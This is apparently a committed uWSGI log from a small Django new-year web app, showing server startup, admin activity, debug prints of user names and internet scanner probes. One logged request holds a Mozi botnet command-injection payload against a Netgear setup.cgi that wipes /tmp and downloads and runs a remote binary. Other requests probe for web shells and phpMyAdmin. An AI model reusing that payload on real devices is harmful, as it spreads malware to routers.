@@ -1,0 +1,203 @@
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Dec 30 21:49:43 2019] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 30 December 2019 09:52:23
+os: Linux-3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019
+nodename: VM_0_15_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /www/wwwroot/wechat
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /www/wwwroot/wechat
+your processes number limit is 7269
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address :9090 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.7 (default, Dec 30 2019, 16:07:13)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Set PythonHome to /root/.virtualenvs/wechat
+Python main interpreter initialized at 0x23f6300
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x23f6300 pid: 19802 (default app)
+mountpoint  already configured. skip.
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 19802)
+spawned uWSGI worker 1 (pid: 19807, cores: 2)
+spawned uWSGI worker 2 (pid: 19808, cores: 2)
+spawned uWSGI worker 3 (pid: 19809, cores: 2)
+spawned uWSGI worker 4 (pid: 19810, cores: 2)
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Dec 30 21:49:49 2019] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 30 December 2019 09:52:23
+os: Linux-3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019
+nodename: VM_0_15_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /www/wwwroot/wechat
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /www/wwwroot/wechat
+your processes number limit is 7269
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+probably another instance of uWSGI is running on the same address (:9090).
+bind(): Address already in use [core/socket.c line 769]
+[pid: 19807|app: 0|req: 1/1] 222.129.58.180 () {46 vars in 923 bytes} [Mon Dec 30 13:51:02 2019] GET /admin/newyear/userinfo/? => generated 20479 bytes in 122 msecs (HTTP/1.1 200) 7 headers in 336 bytes (1 switches on core 0)
+[pid: 19807|app: 0|req: 2/2] 222.129.58.180 () {44 vars in 788 bytes} [Mon Dec 30 13:51:02 2019] GET /admin/jsi18n/ => generated 6808 bytes in 11 msecs (HTTP/1.1 200) 3 headers in 93 bytes (1 switches on core 1)
+[pid: 19807|app: 0|req: 3/3] 222.129.58.180 () {44 vars in 854 bytes} [Mon Dec 30 13:51:05 2019] GET /admin/newyear/ => generated 2862 bytes in 22 msecs (HTTP/1.1 200) 6 headers in 214 bytes (1 switches on core 0)
+[pid: 19807|app: 0|req: 4/4] 222.129.58.180 () {46 vars in 883 bytes} [Mon Dec 30 13:51:07 2019] GET /admin/ => generated 6959 bytes in 31 msecs (HTTP/1.1 200) 6 headers in 214 bytes (1 switches on core 1)
+[pid: 19807|app: 0|req: 5/5] 222.129.58.180 () {42 vars in 792 bytes} [Mon Dec 30 13:51:54 2019] GET /newyear/index/ => generated 4692 bytes in 7 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 19807|app: 0|req: 6/6] 222.129.58.180 () {40 vars in 702 bytes} [Mon Dec 30 13:51:55 2019] GET /favicon.ico => generated 2045 bytes in 3 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[<UserInfo: 张文>, <UserInfo: 朱为准>]
+[pid: 19807|app: 0|req: 7/7] 222.129.58.180 () {44 vars in 803 bytes} [Mon Dec 30 13:51:59 2019] GET /newyear/asydata/?cid=1 => generated 7839 bytes in 35 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+[<UserInfo: 徐海峰>, <UserInfo: 种亚男>, <UserInfo: 韩德胜>, <UserInfo: 于银学>, <UserInfo: 王朴>]
+[pid: 19807|app: 0|req: 8/8] 222.129.58.180 () {44 vars in 803 bytes} [Mon Dec 30 13:52:05 2019] GET /newyear/asydata/?cid=2 => generated 8652 bytes in 12 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 19807|app: 0|req: 9/9] 222.129.58.180 () {46 vars in 909 bytes} [Mon Dec 30 13:52:28 2019] GET /admin/newyear/userinfo/ => generated 20479 bytes in 83 msecs (HTTP/1.1 200) 7 headers in 336 bytes (1 switches on core 1)
+[pid: 19807|app: 0|req: 10/10] 222.129.58.180 () {42 vars in 756 bytes} [Mon Dec 30 13:52:28 2019] GET /admin/jsi18n/ => generated 6808 bytes in 8 msecs (HTTP/1.1 200) 3 headers in 93 bytes (1 switches on core 0)
+[pid: 19807|app: 0|req: 11/11] 222.129.58.180 () {46 vars in 965 bytes} [Mon Dec 30 13:52:32 2019] GET /admin/newyear/userinfo/?is_default__exact=1 => generated 10517 bytes in 61 msecs (HTTP/1.1 200) 7 headers in 336 bytes (1 switches on core 1)
+[pid: 19807|app: 0|req: 12/12] 222.129.58.180 () {42 vars in 776 bytes} [Mon Dec 30 13:52:33 2019] GET /admin/jsi18n/ => generated 6808 bytes in 8 msecs (HTTP/1.1 200) 3 headers in 93 bytes (1 switches on core 0)
+[pid: 19810|app: 0|req: 1/13] 222.129.58.180 () {40 vars in 702 bytes} [Mon Dec 30 13:52:33 2019] GET /favicon.ico => generated 2045 bytes in 26 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 19807|app: 0|req: 13/14] 222.129.58.180 () {44 vars in 980 bytes} [Mon Dec 30 13:52:39 2019] GET /admin/newyear/userinfo/23/?_changelist_filters=is_default__exact%3D1 => generated 8439 bytes in 55 msecs (HTTP/1.1 200) 7 headers in 336 bytes (1 switches on core 1)
+[pid: 19810|app: 0|req: 2/15] 222.129.58.180 () {42 vars in 801 bytes} [Mon Dec 30 13:52:40 2019] GET /admin/jsi18n/ => generated 6808 bytes in 20 msecs (HTTP/1.1 200) 3 headers in 93 bytes (1 switches on core 1)
+[pid: 19807|app: 0|req: 14/16] 222.129.58.180 () {40 vars in 702 bytes} [Mon Dec 30 13:52:40 2019] GET /favicon.ico => generated 2045 bytes in 3 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 19807|app: 0|req: 15/17] 222.129.58.180 () {50 vars in 1236 bytes} [Mon Dec 30 13:52:44 2019] POST /admin/newyear/userinfo/23/?_changelist_filters=is_default__exact%3D1 => generated 0 bytes in 32 msecs (HTTP/1.1 302) 8 headers in 638 bytes (1 switches on core 0)
+[pid: 19807|app: 0|req: 16/18] 222.129.58.180 () {44 vars in 1293 bytes} [Mon Dec 30 13:52:44 2019] GET /admin/newyear/userinfo/23/?_changelist_filters=is_default__exact%3D1 => generated 8606 bytes in 37 msecs (HTTP/1.1 200) 8 headers in 420 bytes (1 switches on core 1)
+[pid: 19807|app: 0|req: 17/19] 222.129.58.180 () {42 vars in 801 bytes} [Mon Dec 30 13:52:45 2019] GET /admin/jsi18n/ => generated 6808 bytes in 7 msecs (HTTP/1.1 200) 3 headers in 93 bytes (1 switches on core 0)
+[pid: 19810|app: 0|req: 3/20] 222.129.58.180 () {40 vars in 702 bytes} [Mon Dec 30 13:52:45 2019] GET /favicon.ico => generated 2045 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 19807|app: 0|req: 18/21] 222.129.58.180 () {46 vars in 971 bytes} [Mon Dec 30 13:52:49 2019] GET /admin/newyear/userinfo/ => generated 20479 bytes in 69 msecs (HTTP/1.1 200) 7 headers in 336 bytes (1 switches on core 1)
+[pid: 19807|app: 0|req: 19/22] 222.129.58.180 () {42 vars in 756 bytes} [Mon Dec 30 13:52:50 2019] GET /admin/jsi18n/ => generated 6808 bytes in 8 msecs (HTTP/1.1 200) 3 headers in 93 bytes (1 switches on core 0)
+[pid: 19807|app: 0|req: 20/23] 222.129.58.180 () {46 vars in 965 bytes} [Mon Dec 30 13:52:52 2019] GET /admin/newyear/userinfo/?is_default__exact=1 => generated 10055 bytes in 50 msecs (HTTP/1.1 200) 7 headers in 336 bytes (1 switches on core 1)
+[pid: 19807|app: 0|req: 21/24] 222.129.58.180 () {42 vars in 776 bytes} [Mon Dec 30 13:52:52 2019] GET /admin/jsi18n/ => generated 6808 bytes in 7 msecs (HTTP/1.1 200) 3 headers in 93 bytes (1 switches on core 0)
+[pid: 19807|app: 0|req: 22/25] 222.129.58.180 () {44 vars in 980 bytes} [Mon Dec 30 13:52:58 2019] GET /admin/newyear/userinfo/14/?_changelist_filters=is_default__exact%3D1 => generated 8439 bytes in 41 msecs (HTTP/1.1 200) 7 headers in 336 bytes (1 switches on core 1)
+[pid: 19807|app: 0|req: 23/26] 222.129.58.180 () {42 vars in 801 bytes} [Mon Dec 30 13:52:58 2019] GET /admin/jsi18n/ => generated 6808 bytes in 7 msecs (HTTP/1.1 200) 3 headers in 93 bytes (1 switches on core 0)
+[pid: 19807|app: 0|req: 24/27] 222.129.58.180 () {50 vars in 1234 bytes} [Mon Dec 30 13:53:02 2019] POST /admin/newyear/userinfo/14/?_changelist_filters=is_default__exact%3D1 => generated 0 bytes in 23 msecs (HTTP/1.1 302) 8 headers in 500 bytes (1 switches on core 1)
+[pid: 19807|app: 0|req: 25/28] 222.129.58.180 () {44 vars in 1130 bytes} [Mon Dec 30 13:53:02 2019] GET /admin/newyear/userinfo/?is_default__exact=1 => generated 9729 bytes in 50 msecs (HTTP/1.1 200) 8 headers in 420 bytes (1 switches on core 0)
+[pid: 19807|app: 0|req: 26/29] 222.129.58.180 () {42 vars in 776 bytes} [Mon Dec 30 13:53:02 2019] GET /admin/jsi18n/ => generated 6808 bytes in 7 msecs (HTTP/1.1 200) 3 headers in 93 bytes (1 switches on core 1)
+[pid: 19807|app: 0|req: 27/30] 222.129.58.180 () {44 vars in 823 bytes} [Mon Dec 30 13:53:08 2019] GET /newyear/index/ => generated 4692 bytes in 6 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[<UserInfo: 徐海峰>, <UserInfo: 种亚男>, <UserInfo: 韩德胜>, <UserInfo: 王朴>]
+[pid: 19807|app: 0|req: 28/31] 222.129.58.180 () {44 vars in 803 bytes} [Mon Dec 30 13:53:10 2019] GET /newyear/asydata/?cid=2 => generated 8925 bytes in 12 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+[<UserInfo: 王炎>]
+[pid: 19807|app: 0|req: 29/32] 222.129.58.180 () {44 vars in 803 bytes} [Mon Dec 30 13:53:17 2019] GET /newyear/asydata/?cid=3 => generated 8113 bytes in 11 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+[<UserInfo: 徐海峰>, <UserInfo: 种亚男>, <UserInfo: 韩德胜>, <UserInfo: 王朴>]
+[pid: 19807|app: 0|req: 30/33] 222.129.58.180 () {44 vars in 803 bytes} [Mon Dec 30 13:53:24 2019] GET /newyear/asydata/?cid=2 => generated 8925 bytes in 12 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19807|app: 0|req: 31/34] 222.129.58.180 () {42 vars in 792 bytes} [Mon Dec 30 13:55:21 2019] GET /newyear/index/ => generated 4692 bytes in 5 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[<UserInfo: 徐海峰>, <UserInfo: 种亚男>, <UserInfo: 韩德胜>, <UserInfo: 王朴>]
+[pid: 19807|app: 0|req: 32/35] 222.129.58.180 () {44 vars in 803 bytes} [Mon Dec 30 13:55:23 2019] GET /newyear/asydata/?cid=2 => generated 8925 bytes in 11 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19807|app: 0|req: 33/36] 222.129.58.180 () {44 vars in 831 bytes} [Mon Dec 30 13:55:34 2019] GET /admin/ => generated 6959 bytes in 25 msecs (HTTP/1.1 200) 6 headers in 214 bytes (1 switches on core 0)
+[pid: 19807|app: 0|req: 34/37] 222.129.58.180 () {42 vars in 790 bytes} [Mon Dec 30 13:55:49 2019] GET /newyear/user/ => generated 583 bytes in 3 msecs (HTTP/1.1 200) 4 headers in 224 bytes (1 switches on core 1)
+[pid: 19807|app: 0|req: 35/38] 222.129.58.180 () {42 vars in 757 bytes} [Mon Dec 30 13:55:49 2019] GET /newyear/user/ => generated 583 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 224 bytes (1 switches on core 0)
+[pid: 19807|app: 0|req: 36/39] 182.254.52.17 () {48 vars in 764 bytes} [Mon Dec 30 14:00:28 2019] GET /5678.php => generated 2036 bytes in 3 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 19807|app: 0|req: 37/40] 116.243.31.170 () {40 vars in 1417 bytes} [Mon Dec 30 14:24:44 2019] GET /newyear/index/?nsukey=vpFKzhPNha4Jpc7SGdvtaFbyClJ8pQTy4lEiRt4tBfljPW4h8B%2BFH%2FSv5j2G7yjyN27nZ%2Bzg9qmWGCft%2BrrnzL1RqGN%2BgobhMpue489uKf4V2BAHrVKhQnYxwLepF0cD%2Fep68dGhwjaxQ7oA%2FF%2BickkPiRJ%2FGDiyirsEhf%2BLYX%2FORbSiXus2dthxTlU9ugTt7iPI9ZJd4GQNoBjdxeuBpA%3D%3D => generated 4692 bytes in 5 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[<UserInfo: 张文>, <UserInfo: 朱为准>]
+[pid: 19807|app: 0|req: 38/41] 116.243.31.170 () {42 vars in 1168 bytes} [Mon Dec 30 14:24:52 2019] GET /newyear/asydata/?cid=1 => generated 8383 bytes in 12 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+[<UserInfo: 徐海峰>, <UserInfo: 种亚男>, <UserInfo: 韩德胜>, <UserInfo: 王朴>]
+[pid: 19807|app: 0|req: 39/42] 116.243.31.170 () {42 vars in 1168 bytes} [Mon Dec 30 14:24:54 2019] GET /newyear/asydata/?cid=2 => generated 8925 bytes in 11 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+[<UserInfo: 王炎>]
+[pid: 19807|app: 0|req: 40/43] 116.243.31.170 () {42 vars in 1168 bytes} [Mon Dec 30 14:24:55 2019] GET /newyear/asydata/?cid=3 => generated 8113 bytes in 11 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+[]
+[pid: 19807|app: 0|req: 41/44] 116.243.31.170 () {42 vars in 1168 bytes} [Mon Dec 30 14:24:56 2019] GET /newyear/asydata/?cid=4 => generated 7850 bytes in 11 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 19807|app: 0|req: 42/45] 190.94.136.220 () {30 vars in 434 bytes} [Mon Dec 30 14:45:46 2019] GET / => generated 2012 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19807|app: 0|req: 43/46] 14.18.182.223 () {48 vars in 770 bytes} [Mon Dec 30 14:50:40 2019] GET /v/index.php => generated 2045 bytes in 4 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19807|app: 0|req: 44/47] 222.129.58.180 () {40 vars in 1224 bytes} [Mon Dec 30 14:51:18 2019] GET /newyear/index/?nsukey=1PvIHudQleybZrKX0WgC7DDtnJIw7%2FLvv3fCAfck2l%2BlDpAnmhgcjwElwLJOGrAEcfXBcKk8pNSHoMT3VSz3sfUX%2FPqyH3BU3QWeMfF%2FEJE6s9U%2FyKNBzD7Hp1ZqqH3%2BKXhChxpIOgu7gknIQySP77l3fq0YqN%2B8vJW8xPh%2BzZl5R64Zqu%2Fxr9DUW5KAo%2F3oudOV3cmtJxcXEUfClv0FlA%3D%3D => generated 4692 bytes in 5 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 1)
+[<UserInfo: 徐海峰>, <UserInfo: 种亚男>, <UserInfo: 韩德胜>, <UserInfo: 王朴>]
+[pid: 19807|app: 0|req: 45/48] 222.129.58.180 () {42 vars in 988 bytes} [Mon Dec 30 14:51:25 2019] GET /newyear/asydata/?cid=2 => generated 8925 bytes in 11 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+[<UserInfo: 王炎>]
+[pid: 19807|app: 0|req: 46/49] 222.129.58.180 () {42 vars in 988 bytes} [Mon Dec 30 14:51:30 2019] GET /newyear/asydata/?cid=3 => generated 8113 bytes in 11 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19807|app: 0|req: 47/50] 101.89.19.140 () {36 vars in 497 bytes} [Mon Dec 30 14:51:43 2019] GET /up.php => generated 2030 bytes in 3 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 19807|app: 0|req: 48/51] 61.241.50.63 () {48 vars in 759 bytes} [Mon Dec 30 15:27:44 2019] GET /99.php => generated 2030 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 19807|app: 0|req: 49/52] 59.36.132.240 () {36 vars in 507 bytes} [Mon Dec 30 15:47:45 2019] GET /laravel.php => generated 2045 bytes in 3 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 19807|app: 0|req: 50/53] 58.247.212.239 () {48 vars in 765 bytes} [Mon Dec 30 16:09:20 2019] GET /help.php => generated 2036 bytes in 3 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 19807|app: 0|req: 51/54] 59.36.132.240 () {36 vars in 485 bytes} [Mon Dec 30 17:14:52 2019] GET / => generated 2012 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 19807|app: 0|req: 52/55] 45.230.101.184 () {32 vars in 468 bytes} [Mon Dec 30 17:21:37 2019] GET / => generated 2015 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 19807|app: 0|req: 53/56] 49.235.86.59 () {42 vars in 803 bytes} [Mon Dec 30 17:32:03 2019] GET / => generated 2012 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 19809|app: 0|req: 1/57] 49.235.86.59 () {42 vars in 831 bytes} [Mon Dec 30 17:32:03 2019] GET /index.php => generated 2039 bytes in 21 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 19809|app: 0|req: 2/58] 14.18.182.223 () {36 vars in 523 bytes} [Mon Dec 30 18:04:18 2019] GET /admin/PMA/index.php => generated 4182 bytes in 8 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19809|app: 0|req: 3/59] 61.241.50.63 () {36 vars in 502 bytes} [Mon Dec 30 18:04:49 2019] GET /indea.php => generated 2039 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19809|app: 0|req: 4/60] 59.36.132.240 () {36 vars in 521 bytes} [Mon Dec 30 18:05:34 2019] GET /myadmin2/index.php => generated 2066 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19809|app: 0|req: 5/61] 101.251.242.238 () {38 vars in 594 bytes} [Mon Dec 30 19:17:18 2019] GET / => generated 2015 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19809|app: 0|req: 6/62] 117.194.170.173 () {26 vars in 598 bytes} [Mon Dec 30 19:18:18 2019] GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.194.170.173:50933/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 => generated 2201 bytes in 3 msecs (HTTP/1.0 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19809|app: 0|req: 7/63] 87.107.61.20 () {32 vars in 460 bytes} [Mon Dec 30 19:32:31 2019] GET / => generated 2015 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19809|app: 0|req: 8/64] 109.94.116.90 () {32 vars in 461 bytes} [Mon Dec 30 22:18:57 2019] GET / => generated 2015 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19809|app: 0|req: 9/65] 117.239.149.94 () {34 vars in 506 bytes} [Mon Dec 30 22:34:06 2019] GET /manager/html => generated 2051 bytes in 4 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19809|app: 0|req: 10/66] 59.36.132.240 () {36 vars in 501 bytes} [Mon Dec 30 22:35:28 2019] GET /cmdd.php => generated 2036 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19809|app: 0|req: 11/67] 59.36.132.240 () {36 vars in 545 bytes} [Mon Dec 30 22:53:49 2019] GET /myadmin/scripts/db___.init.php => generated 2102 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19809|app: 0|req: 12/68] 14.18.182.223 () {48 vars in 800 bytes} [Mon Dec 30 23:04:59 2019] GET /pma/scripts/db___.init.php => generated 2090 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19809|app: 0|req: 13/69] 191.100.11.3 () {30 vars in 432 bytes} [Mon Dec 30 23:09:34 2019] GET / => generated 2012 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19809|app: 0|req: 14/70] 59.36.132.240 () {36 vars in 499 bytes} [Mon Dec 30 23:14:52 2019] GET /no1.php => generated 2033 bytes in 3 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19808|app: 0|req: 1/71] 61.241.50.63 () {36 vars in 520 bytes} [Mon Dec 30 23:14:53 2019] GET /phpAdmin/index.php => generated 2066 bytes in 23 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 19809|app: 0|req: 15/72] 59.36.132.240 () {36 vars in 537 bytes} [Mon Dec 30 23:16:49 2019] GET /admin/phpmyadmin/index.php => generated 4203 bytes in 4 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19809|app: 0|req: 16/73] 80.90.87.67 () {32 vars in 459 bytes} [Mon Dec 30 23:37:48 2019] GET / => generated 2015 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19809|app: 0|req: 17/74] 59.36.132.240 () {36 vars in 541 bytes} [Tue Dec 31 00:03:09 2019] GET /mysql/mysqlmanager/index.php => generated 2096 bytes in 4 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19809|app: 0|req: 18/75] 49.235.86.59 () {42 vars in 803 bytes} [Tue Dec 31 00:05:45 2019] GET / => generated 2012 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19807|app: 0|req: 54/76] 49.235.86.59 () {42 vars in 831 bytes} [Tue Dec 31 00:05:45 2019] GET /index.php => generated 2039 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 19809|app: 0|req: 19/77] 51.79.121.114 () {36 vars in 559 bytes} [Tue Dec 31 00:13:22 2019] GET / => generated 2012 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19807|app: 0|req: 55/78] 51.79.121.114 () {38 vars in 609 bytes} [Tue Dec 31 00:13:23 2019] GET /HNAP1/ => generated 2030 bytes in 3 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 19809|app: 0|req: 20/79] 59.36.132.240 () {36 vars in 515 bytes} [Tue Dec 31 00:13:30 2019] GET /phpma/index.php => generated 2057 bytes in 4 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19809|app: 0|req: 21/80] 182.254.52.17 () {36 vars in 505 bytes} [Tue Dec 31 00:16:30 2019] GET /Drupal.php => generated 2042 bytes in 3 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19809|app: 0|req: 22/81] 61.241.50.63 () {36 vars in 532 bytes} [Tue Dec 31 00:17:51 2019] GET /phpmyadmin-old/index.php => generated 2084 bytes in 3 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19809|app: 0|req: 23/82] 182.254.52.17 () {36 vars in 495 bytes} [Tue Dec 31 00:39:19 2019] GET /b.php => generated 2027 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19809|app: 0|req: 24/83] 101.89.19.140 () {36 vars in 503 bytes} [Tue Dec 31 00:43:10 2019] GET /index.php => generated 2039 bytes in 3 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19809|app: 0|req: 25/84] 182.254.52.17 () {36 vars in 503 bytes} [Tue Dec 31 00:48:27 2019] GET /shell.php => generated 2039 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19809|app: 0|req: 26/85] 61.241.50.63 () {36 vars in 508 bytes} [Tue Dec 31 00:53:27 2019] GET /db/index.php => generated 2048 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19809|app: 0|req: 27/86] 220.207.80.239 () {40 vars in 744 bytes} [Tue Dec 31 01:02:11 2019] GET /newyear/index/ => generated 4692 bytes in 16 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 1)
+[pid: 19808|app: 0|req: 2/87] 220.207.80.239 () {40 vars in 670 bytes} [Tue Dec 31 01:02:12 2019] GET /favicon.ico => generated 2045 bytes in 3 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[<UserInfo: 王炎>]
+[pid: 19808|app: 0|req: 3/88] 220.207.80.239 () {42 vars in 694 bytes} [Tue Dec 31 01:02:14 2019] GET /newyear/asydata/?cid=3 => generated 8113 bytes in 41 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+[]
+[pid: 19807|app: 0|req: 56/89] 220.207.80.239 () {42 vars in 694 bytes} [Tue Dec 31 01:02:15 2019] GET /newyear/asydata/?cid=4 => generated 7850 bytes in 10 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+[<UserInfo: 徐海峰>, <UserInfo: 种亚男>, <UserInfo: 韩德胜>, <UserInfo: 王朴>]
+[pid: 19807|app: 0|req: 57/90] 220.207.80.239 () {42 vars in 694 bytes} [Tue Dec 31 01:02:17 2019] GET /newyear/asydata/?cid=2 => generated 8925 bytes in 11 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+[<UserInfo: 张文>, <UserInfo: 朱为准>]
+[pid: 19807|app: 0|req: 58/91] 220.207.80.239 () {42 vars in 694 bytes} [Tue Dec 31 01:02:17 2019] GET /newyear/asydata/?cid=1 => generated 8383 bytes in 10 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+[<UserInfo: 徐海峰>, <UserInfo: 种亚男>, <UserInfo: 韩德胜>, <UserInfo: 王朴>]
+[pid: 19807|app: 0|req: 59/92] 220.207.80.239 () {42 vars in 694 bytes} [Tue Dec 31 01:02:19 2019] GET /newyear/asydata/?cid=2 => generated 8925 bytes in 10 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+[<UserInfo: 王炎>]
+[pid: 19807|app: 0|req: 60/93] 220.207.80.239 () {42 vars in 694 bytes} [Tue Dec 31 01:02:19 2019] GET /newyear/asydata/?cid=3 => generated 8113 bytes in 11 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+[]
+[pid: 19807|app: 0|req: 61/94] 220.207.80.239 () {42 vars in 694 bytes} [Tue Dec 31 01:02:20 2019] GET /newyear/asydata/?cid=4 => generated 7850 bytes in 11 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+[<UserInfo: 张文>, <UserInfo: 朱为准>]
+[pid: 19807|app: 0|req: 62/95] 220.207.80.239 () {42 vars in 694 bytes} [Tue Dec 31 01:02:27 2019] GET /newyear/asydata/?cid=1 => generated 8383 bytes in 11 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
